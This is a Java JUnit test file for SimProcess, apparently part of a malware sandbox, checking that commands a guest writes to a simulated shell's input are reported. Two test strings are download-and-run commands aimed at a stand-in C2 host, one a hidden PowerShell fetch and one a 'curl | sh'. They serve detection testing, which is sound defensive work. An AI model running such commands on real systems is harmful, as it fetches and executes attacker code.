package dev.javabyte.env;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import dev.javabyte.report.Artifacts;
import dev.javabyte.report.Event;
import dev.javabyte.report.EventLog;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/** What the guest writes to a launched process's standard input reaches the report. */
class SimProcessTest {

    @TempDir
    Path out;

    private final EventLog events = new EventLog(1000, null);

    private List<Event> stdinEvents() {
        return events.byCategory("process").stream().filter(event -> event.action().equals("stdin")).toList();
    }

    @Test
    void commandsWrittenToAShellAreReportedOnFlushAndClose() throws Exception {
        SimProcess shell = new SimProcess("", "", 0, "cmd.exe", events, new Artifacts(out));
        OutputStream stdin = shell.getOutputStream();
        stdin.write("powershell -w hidden -c iwr http://c2.example/a.ps1\r\n".getBytes(StandardCharsets.UTF_8));
        stdin.flush();
        stdin.write("exit\r\n".getBytes(StandardCharsets.UTF_8));
        stdin.close();
        shell.reportInput(); // nothing left: already reported on close

        List<Event> reported = stdinEvents();
        assertEquals(2, reported.size());
        assertEquals("cmd.exe", reported.get(0).data().get("command"));
        assertTrue(String.valueOf(reported.get(0).data().get("preview")).contains("powershell"), reported.toString());
        String file = String.valueOf(reported.get(1).data().get("file"));
        assertEquals("exit\r\n", Files.readString(out.resolve(file)));
    }

    @Test
    void inputNeverFlushedIsReportedAtTheEnd() throws Exception {
        SimProcess shell = new SimProcess("", "", 0, "/bin/sh", events, null);
        shell.getOutputStream().write("curl http://c2.example | sh\n".getBytes(StandardCharsets.UTF_8));
        assertEquals(0, stdinEvents().size());
        shell.reportInput();
        assertEquals(1, stdinEvents().size());
        assertEquals(28, stdinEvents().get(0).data().get("size"));
    }

    @Test
    void aFullPipeBufferIsReportedWithoutAFlush() throws Exception {
        SimProcess shell = new SimProcess("", "", 0, "cmd.exe", events, null);
        shell.getOutputStream().write(new byte[SimProcess.PIPE_BUFFER]);
        assertEquals(1, stdinEvents().size());
    }

    @Test
    void withoutAnEventLogInputIsDiscarded() throws Exception {
        SimProcess process = new SimProcess("out", "", 3);
        process.getOutputStream().write(1);
        process.getOutputStream().close();
        process.reportInput();
        assertEquals(3, process.waitFor());
        assertEquals(List.of(), events.events());
    }

    @Test
    void theProcessDoesNotMakeUpItsOwnId() {
        // Process.pid() is answered by the ProcessStubs stub with an id from the machine; the
        // class itself has none, and its refusal does not name the emulator's class.
        SimProcess process = new SimProcess("", "", 0);
        UnsupportedOperationException refused = assertThrows(UnsupportedOperationException.class, process::pid);
        assertNull(refused.getMessage());
    }
}
